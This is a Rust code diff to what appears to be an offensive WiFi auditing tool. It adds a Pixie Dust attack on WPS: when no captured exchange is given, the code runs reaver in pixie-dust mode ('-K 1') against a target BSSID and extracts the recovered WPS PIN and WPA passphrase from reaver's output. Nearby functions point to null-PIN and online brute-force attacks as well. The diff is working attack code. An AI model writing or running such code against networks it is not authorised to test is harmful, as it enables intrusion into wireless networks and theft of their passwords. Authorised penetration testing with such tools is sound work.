@@ -113,6 +113,14 @@ pub fn try_null_pin(bssid: &str) -> WpsResult {
 pub fn try_pixie_dust(bssid: &str, m1: &[u8], m3: &[u8]) -> WpsResult {
     let started = std::time::Instant::now();
 
+    // Real-radio path: empty buffers mean "no synthetic exchange" — drive the
+    // full WPS exchange + offline recovery through reaver's pixie-dust mode
+    // (`-K 1`), the same way the classic tools run it. Our internal math path
+    // (below) only applies to a pre-captured exchange.
+    if m1.is_empty() && m3.is_empty() {
+        return pixie_dust_via_reaver(bssid, started);
+    }
+
     // Step 1: parse the two WPS messages to recover the public parameters
     // we need: PKE, PKR, E-Nonce1, E-Nonce2, AuthKey, E-Hash1, E-Hash2.
     let parsed = match parse_wps_exchange(m1, m3) {
@@ -338,6 +346,46 @@ fn recover_pixie_dust_pin(ex: &WpsExchange, chip: &ChipPattern) -> Option<String
     pin7[..4].copy_from_slice(p1_bytes);
     pin7[4..].copy_from_slice(&p2_bytes[..3]);
     netspecter_common::wps_crypto::build_full_pin(&pin7)
+}
+
+/// Full Pixie Dust through reaver itself: reaver runs the WPS registrar
+/// exchange AND the offline weak-PRNG recovery (`-K 1`), which is exactly
+/// what the classic tools (wifite/fluxion) shell out to. We parse the PIN
+/// (and PSK when the AP hands it over) from the output.
+fn pixie_dust_via_reaver(bssid: &str, started: std::time::Instant) -> WpsResult {
+    let iface = get_iface().clone().unwrap_or_else(|| "wlan0".into());
+    let out = Command::new("reaver")
+        .args(["-i", &iface, "-b", bssid, "-K", "1", "-vv", "-L"])
+        .output();
+
+    let base = |status: String, pin: Option<String>, psk: Option<String>| WpsResult {
+        bssid: bssid.into(),
+        strategy: WpsStrategy::PixieDust,
+        pin,
+        psk,
+        duration_secs: started.elapsed().as_secs(),
+        status,
+    };
+
+    match out {
+        Err(e) => base(format!("reaver spawn failed: {e} (is reaver installed?)"), None, None),
+        Ok(o) => {
+            let stdout = String::from_utf8_lossy(&o.stdout).to_string();
+            let pin = extract_field(&stdout, "WPS PIN:").map(|p| {
+                p.trim_matches(|c| c == '\'' || c == '"').to_string()
+            });
+            let psk = extract_field(&stdout, "WPA PSK:").map(|p| {
+                p.trim_matches(|c| c == '\'' || c == '"').to_string()
+            });
+            if pin.is_some() {
+                base("PIN recovered via reaver pixie-dust".into(), pin, psk)
+            } else if stdout.contains("WPS fail") || stdout.contains("already associated") {
+                base("AP rejected the WPS exchange or is locked".into(), None, None)
+            } else {
+                base("weak PRNG not detected - falling back to online brute".into(), None, None)
+            }
+        }
+    }
 }
 
 fn run_reaver_with_pin(bssid: &str, pin: &str) -> BruteOutcome {
